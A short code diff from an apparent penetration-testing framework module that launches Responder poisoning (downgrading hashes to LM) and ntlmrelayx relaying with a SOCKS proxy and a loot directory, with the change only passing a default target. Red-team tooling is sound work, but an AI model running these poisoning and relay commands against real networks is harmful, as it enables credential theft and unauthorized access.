@@ -42,14 +42,14 @@ def main(apiclient, **kwargs):
             if dialog.rvalue is not None:
                 responder_conf = dialog.rvalue.strip()
                 utils.executeInExternalTerm(f"sudo sed -i -E 's/(HTTP|SMB) = On/\1 = Off/gm' {responder_conf}")
-                utils.executeInExternalTerm(f"sudo responder -I {dialog.rvalue} -dvw --lm --disable-ess")
+                utils.executeInExternalTerm(f"sudo responder -I {dialog.rvalue} -dvw --lm --disable-ess", default_target=kwargs.get("default_target", None))
     cmd = ""
     if dialog.rvalue == "Yes":
         cmd = 'sudo sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
         utils.executeInExternalTerm(f"'{cmd}'")
 
     cmd = f"sudo ntlmrelayx -tf {file_name} -smb2support -socks -l {relaying_loot_path}"
-    utils.executeInExternalTerm(f"'{cmd}'")
+    utils.executeInExternalTerm(f"'{cmd}'", default_target=kwargs.get("default_target", None))
     return True, f"Listening ntlmrelay opened, loot directory is here:"+str(relaying_loot_path)+"\n"+ \
             "Don't forget to open Responder with HTTP and SMB disabled\n" + \
                 "Proxychains port should be 1080 (default)"
